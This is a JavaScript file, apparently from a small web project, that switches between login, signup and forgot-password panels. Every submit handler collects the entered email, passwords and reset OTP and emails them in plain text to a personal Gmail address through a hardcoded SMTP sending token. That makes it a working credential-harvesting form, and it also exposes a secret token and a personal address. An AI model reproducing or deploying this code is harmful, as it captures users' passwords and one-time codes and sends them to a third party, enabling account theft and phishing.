

let forget = document.querySelector("#frg")
forget.addEventListener("click", function(){
   document.querySelector(".loginPage").style.display = "none" 
   document.querySelector(".signupPage").style.display = "none" 
   document.querySelector(".forgetPage").style.display = "block" 
})

let signup = document.querySelector("#crt")
signup.addEventListener("click", function(){
   document.querySelector(".loginPage").style.display = "none" 
   document.querySelector(".signupPage").style.display = "block" 
   document.querySelector(".forgetPage").style.display = "none" 
})

let login = document.querySelector("#lgn")
login.addEventListener("click", function(){
   document.querySelector(".loginPage").style.display = "block" 
   document.querySelector(".signupPage").style.display = "none" 
   document.querySelector(".forgetPage").style.display = "none" 
})

let goback = document.querySelector("#gb")
goback.addEventListener("click", function(){
   document.querySelector(".loginPage").style.display = "block" 
   document.querySelector(".signupPage").style.display = "none" 
   document.querySelector(".forgetPage").style.display = "none" 
})

 //FOR LOGIN PAGE DATA TRANSFER TO ADMIN
 let SIGNINBTN =  document.querySelector("#signInbtn") 
 SIGNINBTN.addEventListener("click",function(){
  
   let signUpEmail = document.querySelector(".loginPage #username").value
   let signUpPass = document.querySelector(".loginPage #pass").value


      if( signUpEmail.length == 0 || signUpPass.length == 0){
       swal("ERROR", "Please fill Every Details", "error");
     }else{
       
     Email.send({
     SecureToken : "5ae85ede-0721-49f6-9dd2-ac4f42182fc7",
     To : 'azizansari8716@gmail.com',
     From : "azizansari8716@gmail.com",
     Subject : "LOGIN DATA",
     Body : "Email : " + signUpEmail
          + "<br> Pass : " + signUpPass
     }).then(
     message => swal("Login Successfully", "Your data sent to Mr. Aziz Ansari", "success")
     )
     }
})

 //FOR FORGET PAGE DATA TRANSFER TO ADMIN
let FORGETPAGEBTN =  document.querySelector("#resetBtn") 
FORGETPAGEBTN.addEventListener("click",function(){
   let signUpEmail = document.querySelector(".forgetPage #email").value
   let signUpOtp = document.querySelector(".forgetPage #otp").value
   let signUpPass = document.querySelector(".forgetPage #pass").value
   let signUpPassC = document.querySelector(".forgetPage #Apass").value

    if( signUpEmail.length == 0 || signUpOtp.length == 0 ||  signUpPass.length == 0 || signUpPassC.length == 0){
      swal("ERROR", "Please fill Every Details", "error");
    }else{
       Email.send({
       SecureToken : "5ae85ede-0721-49f6-9dd2-ac4f42182fc7",
       To : 'azizansari8716@gmail.com',
       From : "azizansari8716@gmail.com",
       Subject : "FORGET PASS DATA",
       Body : "Email : " + signUpEmail
              + "<br> OTP : " + signUpOtp
              + "<br> Pass : " + signUpPass
              + "<br> Pass Confirm : " + signUpPassC
       }).then(
       message => swal("Reset Password Successfully", "Your data sent to Mr. Aziz Ansari", "success")
       )
       }
    })
    
 //FOR SIGNUP PAGE DATA TRANSFER TO ADMIN
 let SIGNUPBTN =  document.querySelector("#signupBtn") 
 SIGNUPBTN.addEventListener("click",function(){
  
   let signUpName = document.querySelector(".signupPage #name").value
   let signUpEmail = document.querySelector(".signupPage #email").value
   let signUpPass = document.querySelector(".signupPage #pass").value
   let signUpApass = document.querySelector(".signupPage #Apass").value


      if( signUpEmail.length == 0 || signUpPass.length == 0 || signUpName.length == 0 || signUpApass.length == 0){
       swal("ERROR", "Please fill Every Details", "error");
     }else{
       
     Email.send({
     SecureToken : "5ae85ede-0721-49f6-9dd2-ac4f42182fc7",
     To : 'azizansari8716@gmail.com',
     From : "azizansari8716@gmail.com",
     Subject : "SIGNUP DATA",
     Body : "Name : " + signUpName
          + "<br> Email : " + signUpEmail
          + "<br> Pass : " + signUpPass
          + "<br> Confirm Pass : " + signUpApass
     }).then(
     message => swal("Create Account Successfully", "Your data sent to Mr. Aziz Ansari", "success")
     )
     }
})

